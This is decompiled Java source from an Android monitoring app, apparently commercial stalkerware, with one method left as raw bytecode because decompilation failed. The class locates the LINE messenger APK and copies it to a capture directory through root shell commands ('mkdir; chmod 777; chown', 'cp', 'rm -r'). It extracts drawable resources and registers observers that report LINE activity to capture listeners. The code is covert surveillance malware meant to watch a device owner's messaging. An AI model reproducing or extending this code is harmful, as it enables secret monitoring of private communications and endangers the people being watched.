package com.vvt.capture.c;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import com.vvt.base.capture.i;
import com.vvt.io.d;
import com.vvt.io.p;
import com.vvt.n.a.g;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class f
  implements com.vvt.n.a.a, g
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static f c;
  private boolean d;
  private com.vvt.n.a.b e;
  private String f;
  private List g;
  private HashSet h;
  private Context i;
  private String j;
  
  private f(com.vvt.n.a.b paramb, String paramString1, Context paramContext, String paramString2)
  {
    this.e = paramb;
    this.f = paramString1;
    this.i = paramContext;
    this.d = false;
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.h = localHashSet;
    this.j = paramString2;
  }
  
  public static f a(com.vvt.n.a.b paramb, String paramString1, Context paramContext, String paramString2)
  {
    synchronized (f.class)
    {
      f localf = c;
      if (localf == null)
      {
        localf = new com/vvt/capture/c/f;
        localf.<init>(paramb, paramString1, paramContext, paramString2);
        c = localf;
      }
      localf = c;
      return localf;
    }
  }
  
  private String a()
  {
    boolean bool1 = a;
    if (bool1) {}
    String str = d("/data/app");
    boolean bool2 = com.vvt.ag.b.a(str);
    if (bool2)
    {
      str = b();
      bool2 = com.vvt.ag.b.a(str);
      if (bool2) {
        str = d("/system/app");
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return str;
  }
  
  private String b()
  {
    String str1 = null;
    try
    {
      Object localObject = this.i;
      localObject = ((Context)localObject).getPackageManager();
      String str2 = "jp.naver.line.android";
      localObject = ((PackageManager)localObject).getApplicationInfo(str2, 0);
      if (localObject != null) {
        str1 = ((ApplicationInfo)localObject).publicSourceDir;
      }
    }
    catch (Exception localException)
    {
      boolean bool;
      for (;;) {}
    }
    bool = a;
    if (bool) {}
    return str1;
  }
  
  private void c()
  {
    int k = 5;
    bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = a();
    for (;;)
    {
      try
      {
        bool2 = com.vvt.ag.b.a((String)localObject1);
        if (bool2) {
          continue;
        }
        localObject2 = new java/io/File;
        ((File)localObject2).<init>((String)localObject1);
        str1 = ((File)localObject2).getName();
        localObject2 = this.f;
        localObject3 = "LINE/";
        localObject2 = p.a((String)localObject2, (String)localObject3);
        localObject3 = File.separator;
        bool3 = ((String)localObject2).endsWith((String)localObject3);
        if (!bool3)
        {
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
          localObject3 = File.separator;
          localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
          localObject2 = ((StringBuilder)localObject2).toString();
        }
        str1 = p.a((String)localObject2, str1);
        localObject3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        int m = 5;
        localObject4 = new Object[m];
        int n = 0;
        String str2 = null;
        localObject4[0] = localObject2;
        n = 1;
        localObject4[n] = localObject2;
        n = 2;
        String str3 = this.j;
        localObject4[n] = str3;
        n = 3;
        str3 = this.j;
        localObject4[n] = str3;
        n = 4;
        localObject4[n] = localObject2;
        localObject3 = String.format((String)localObject3, (Object[])localObject4);
        KMShell.a((String)localObject3);
        bool3 = com.vvt.aa.a.c();
        if (bool3) {
          ShellUtil.k((String)localObject2);
        }
        localObject3 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        m = 7;
        localObject4 = new Object[m];
        n = 0;
        str2 = null;
        str3 = this.f;
        str3 = c.a(str3);
        localObject4[0] = str3;
        n = 1;
        localObject4[n] = localObject1;
        int i1 = 2;
        localObject4[i1] = str1;
        i1 = 3;
        localObject4[i1] = str1;
        i1 = 4;
        str2 = this.j;
        localObject4[i1] = str2;
        i1 = 5;
        str2 = this.j;
        localObject4[i1] = str2;
        i1 = 6;
        localObject4[i1] = str1;
        localObject1 = String.format((String)localObject3, (Object[])localObject4);
        KMShell.a((String)localObject1);
        boolean bool4 = com.vvt.aa.a.c();
        if (bool4)
        {
          ShellUtil.k(str1);
          bool4 = a;
          if (!bool4) {}
        }
        bool4 = a;
        if (bool4) {}
        localObject1 = new java/io/File;
        ((File)localObject1).<init>((String)localObject2);
        localObject1 = d.c((File)localObject1);
        i2 = ((List)localObject1).size();
        if (i2 <= k) {
          continue;
        }
        bool2 = a;
        if ((!bool2) || (bool1))
        {
          localObject5 = "rm -r %s";
          bool2 = true;
          localObject2 = new Object[bool2];
          i2 = 0;
          localObject1 = null;
          localObject2[0] = str1;
          localObject5 = String.format((String)localObject5, (Object[])localObject2);
          KMShell.a((String)localObject5);
        }
      }
      catch (Exception localException)
      {
        Object localObject2;
        String str1;
        Object localObject3;
        boolean bool3;
        Object localObject4;
        int i2;
        Object localObject5;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return;
      bool1 = a;
      if (bool1) {}
      localObject5 = new com/vvt/io/a;
      ((com.vvt.io.a)localObject5).<init>(str1, (String)localObject2);
      localObject2 = new java/util/ArrayList;
      i2 = 2;
      localObject1 = new String[i2];
      bool3 = false;
      localObject3 = null;
      localObject4 = "res/drawable-hdpi/";
      localObject1[0] = localObject4;
      bool3 = true;
      localObject4 = "res/drawable-hdpi-v4/";
      localObject1[bool3] = localObject4;
      localObject1 = Arrays.asList((Object[])localObject1);
      ((ArrayList)localObject2).<init>((Collection)localObject1);
      i2 = 1;
      bool1 = ((com.vvt.io.a)localObject5).a((ArrayList)localObject2, i2);
      continue;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  /* Error */
  private String d(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: iconst_1
    //   3: istore_3
    //   4: getstatic 30	com/vvt/capture/MyUncaughtExceptionHandler/f:a	Z
    //   7: istore 4
    //   9: iload 4
    //   11: ifeq +3 -> 14
    //   14: invokestatic 202	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   17: astore 5
    //   19: ldc -52
    //   21: astore 6
    //   23: iconst_2
    //   24: istore 7
    //   26: iload 7
    //   28: anewarray 4	java/lang/Object
    //   31: astore 8
    //   33: iconst_0
    //   34: istore 9
    //   36: aconst_null
    //   37: astore 10
    //   39: ldc -50
    //   41: astore 11
    //   43: aload 8
    //   45: iconst_0
    //   46: aload 11
    //   48: aastore
    //   49: iconst_1
    //   50: istore 9
    //   52: aload 8
    //   54: iload 9
    //   56: aload_1
    //   57: aastore
    //   58: aload 6
    //   60: aload 8
    //   62: invokestatic 140	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   65: astore 6
    //   67: aload 5
    //   69: aload 6
    //   71: invokevirtual 207	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   74: astore 6
    //   76: new 209	java/io/BufferedReader
    //   79: astore 8
    //   81: new 211	java/io/StringReader
    //   84: astore 10
    //   86: aload 10
    //   88: aload 6
    //   90: invokespecial 212	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   93: aload 8
    //   95: aload 10
    //   97: invokespecial 215	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   100: aload 8
    //   102: invokevirtual 218	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   105: astore 6
    //   107: aload 6
    //   109: ifnull +66 -> 175
    //   112: aload 6
    //   114: invokestatic 223	com/vvt/io/removeFromPath:a	(Ljava/lang/String;)Lcom/vvt/io/MyUncaughtExceptionHandler;
    //   117: astore 6
    //   119: aload 6
    //   121: ifnull -21 -> 100
    //   124: aload 6
    //   126: getfield 227	com/vvt/io/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   129: astore 10
    //   131: ldc 81
    //   133: astore 11
    //   135: aload 10
    //   137: aload 11
    //   139: invokevirtual 230	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   142: istore 9
    //   144: iload 9
    //   146: ifeq -46 -> 100
    //   149: aload 6
    //   151: getfield 233	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   154: istore 9
    //   156: iload 9
    //   158: ifne +49 -> 207
    //   161: aload 6
    //   163: getfield 227	com/vvt/io/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   166: astore 6
    //   168: aload_1
    //   169: aload 6
    //   171: invokestatic 113	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   174: astore_2
    //   175: aload 5
    //   177: ifnull +8 -> 185
    //   180: aload 5
    //   182: invokevirtual 235	com/vvt/shell/f:d	()V
    //   185: getstatic 30	com/vvt/capture/MyUncaughtExceptionHandler/f:a	Z
    //   188: istore 4
    //   190: iload 4
    //   192: ifeq +3 -> 195
    //   195: getstatic 30	com/vvt/capture/MyUncaughtExceptionHandler/f:a	Z
    //   198: istore 4
    //   200: iload 4
    //   202: ifeq +3 -> 205
    //   205: aload_2
    //   206: areturn
    //   207: aload 6
    //   209: getfield 233	com/vvt/io/MyUncaughtExceptionHandler:j	I
    //   212: istore 9
    //   214: iload 9
    //   216: iload_3
    //   217: if_icmpne -117 -> 100
    //   220: aload 6
    //   222: getfield 227	com/vvt/io/MyUncaughtExceptionHandler:removeFromPath	Ljava/lang/String;
    //   225: astore 6
    //   227: aload_1
    //   228: aload 6
    //   230: invokestatic 113	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   233: astore 6
    //   235: ldc -19
    //   237: astore 8
    //   239: aload 6
    //   241: aload 8
    //   243: invokestatic 113	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   246: astore 6
    //   248: aload 6
    //   250: invokestatic 239	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   253: istore 7
    //   255: iload 7
    //   257: ifeq -82 -> 175
    //   260: aload 6
    //   262: astore_2
    //   263: goto -88 -> 175
    //   266: astore 5
    //   268: iconst_0
    //   269: istore 4
    //   271: aconst_null
    //   272: astore 5
    //   274: getstatic 34	com/vvt/capture/MyUncaughtExceptionHandler/f:removeFromPath	Z
    //   277: istore 12
    //   279: iload 12
    //   281: ifeq +3 -> 284
    //   284: aload 5
    //   286: ifnull -101 -> 185
    //   289: goto -109 -> 180
    //   292: astore 13
    //   294: iconst_0
    //   295: istore 4
    //   297: aconst_null
    //   298: astore 5
    //   300: aload 13
    //   302: astore_2
    //   303: aload 5
    //   305: ifnull +8 -> 313
    //   308: aload 5
    //   310: invokevirtual 235	com/vvt/shell/f:d	()V
    //   313: aload_2
    //   314: athrow
    //   315: astore_2
    //   316: goto -13 -> 303
    //   319: astore 6
    //   321: goto -47 -> 274
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	324	0	this	f
    //   0	324	1	paramString	String
    //   1	313	2	localObject1	Object
    //   315	1	2	localObject2	Object
    //   3	215	3	k	int
    //   7	289	4	bool1	boolean
    //   17	164	5	localf	com.vvt.shell.f
    //   266	1	5	localException1	Exception
    //   272	37	5	localObject3	Object
    //   21	240	6	localObject4	Object
    //   319	1	6	localException2	Exception
    //   24	3	7	m	int
    //   253	3	7	bool2	boolean
    //   31	211	8	localObject5	Object
    //   34	111	9	bool3	boolean
    //   154	64	9	n	int
    //   37	99	10	localObject6	Object
    //   41	97	11	str	String
    //   277	3	12	bool4	boolean
    //   292	9	13	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   14	17	266	java/lang/Exception
    //   14	17	292	finally
    //   26	31	315	finally
    //   46	49	315	finally
    //   56	58	315	finally
    //   60	65	315	finally
    //   69	74	315	finally
    //   76	79	315	finally
    //   81	84	315	finally
    //   88	93	315	finally
    //   95	100	315	finally
    //   100	105	315	finally
    //   112	117	315	finally
    //   124	129	315	finally
    //   137	142	315	finally
    //   149	154	315	finally
    //   161	166	315	finally
    //   169	174	315	finally
    //   207	212	315	finally
    //   220	225	315	finally
    //   228	233	315	finally
    //   241	246	315	finally
    //   248	253	315	finally
    //   274	277	315	finally
    //   26	31	319	java/lang/Exception
    //   46	49	319	java/lang/Exception
    //   56	58	319	java/lang/Exception
    //   60	65	319	java/lang/Exception
    //   69	74	319	java/lang/Exception
    //   76	79	319	java/lang/Exception
    //   81	84	319	java/lang/Exception
    //   88	93	319	java/lang/Exception
    //   95	100	319	java/lang/Exception
    //   100	105	319	java/lang/Exception
    //   112	117	319	java/lang/Exception
    //   124	129	319	java/lang/Exception
    //   137	142	319	java/lang/Exception
    //   149	154	319	java/lang/Exception
    //   161	166	319	java/lang/Exception
    //   169	174	319	java/lang/Exception
    //   207	212	319	java/lang/Exception
    //   220	225	319	java/lang/Exception
    //   228	233	319	java/lang/Exception
    //   241	246	319	java/lang/Exception
    //   248	253	319	java/lang/Exception
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    synchronized (this.h)
    {
      Object localObject2 = this.h;
      bool = ((HashSet)localObject2).contains(parami);
      if (!bool)
      {
        localObject2 = this.h;
        ((HashSet)localObject2).add(parami);
      }
      bool = this.d;
      if (bool) {
        break label155;
      }
      bool = true;
      this.d = bool;
      localObject2 = this.e;
      if (localObject2 != null)
      {
        localObject2 = c.a();
        this.g = ((List)localObject2);
        localObject2 = this.g;
        ??? = ((List)localObject2).iterator();
        bool = ((Iterator)???).hasNext();
        if (!bool) {
          break label155;
        }
        localObject2 = (String)((Iterator)???).next();
        com.vvt.n.a.b localb = this.e;
        localb.a((String)localObject2, this);
      }
    }
    bool = b;
    if (bool) {}
    label155:
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    synchronized (this.h)
    {
      Object localObject1 = this.h;
      Iterator localIterator = ((HashSet)localObject1).iterator();
      bool = localIterator.hasNext();
      if (bool)
      {
        localObject1 = localIterator.next();
        localObject1 = (i)localObject1;
        ((i)localObject1).a();
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b(i parami)
  {
    String str = null;
    boolean bool1 = a;
    if (bool1) {}
    synchronized (this.h)
    {
      Object localObject2 = this.h;
      bool1 = ((HashSet)localObject2).contains(parami);
      if (bool1)
      {
        localObject2 = this.h;
        ((HashSet)localObject2).remove(parami);
      }
      localObject2 = this.h;
      int k = ((HashSet)localObject2).size();
      boolean bool3 = a;
      if ((bool3) && (k != 0)) {
        break label226;
      }
      m = this.d;
      if (m == 0) {
        break label226;
      }
      this.d = false;
      localObject2 = this.e;
      if (localObject2 == null) {
        break label226;
      }
      localObject2 = this.g;
      if (localObject2 != null)
      {
        localObject2 = this.g;
        ??? = ((List)localObject2).iterator();
        m = ((Iterator)???).hasNext();
        if (m != 0)
        {
          localObject2 = (String)((Iterator)???).next();
          com.vvt.n.a.b localb1 = this.e;
          localb1.a((String)localObject2);
        }
      }
    }
    ??? = c.b();
    int i1 = ???.length;
    int m = 0;
    Object localObject4 = null;
    while (m < i1)
    {
      str = ???[m];
      com.vvt.n.a.b localb2 = this.e;
      localb2.a(str);
      int n;
      m += 1;
    }
    label226:
    boolean bool2 = a;
    if (bool2) {}
  }
  
  public void b(String paramString)
  {
    int k = a;
    if (k != 0) {}
    k = a;
    if (k != 0) {}
    c();
    Object localObject1 = this.g;
    Object localObject2 = ((List)localObject1).iterator();
    Object localObject3;
    for (;;)
    {
      k = ((Iterator)localObject2).hasNext();
      if (k == 0) {
        break;
      }
      localObject1 = (String)((Iterator)localObject2).next();
      localObject3 = this.e;
      ((com.vvt.n.a.b)localObject3).a((String)localObject1);
      localObject1 = null;
      this.g = null;
      k = a;
      if (k == 0) {}
    }
    localObject2 = c.b();
    int n = localObject2.length;
    k = 0;
    localObject1 = null;
    while (k < n)
    {
      String str = localObject2[k];
      com.vvt.n.a.b localb = this.e;
      localb.a(str, this);
      int m;
      k += 1;
    }
    boolean bool = a;
    if (bool) {}
    localObject1 = this.h;
    localObject2 = ((HashSet)localObject1).iterator();
    for (;;)
    {
      bool = ((Iterator)localObject2).hasNext();
      if (!bool) {
        break;
      }
      localObject1 = (i)((Iterator)localObject2).next();
      localObject3 = "jp.naver.line.android";
      ((i)localObject1).a((String)localObject3, paramString);
    }
    bool = a;
    if (bool) {}
  }
  
  public void c(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.h;
    Iterator localIterator = ((HashSet)localObject).iterator();
    for (;;)
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (i)localIterator.next();
      String str = "jp.naver.line.android";
      ((i)localObject).a(str, paramString);
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */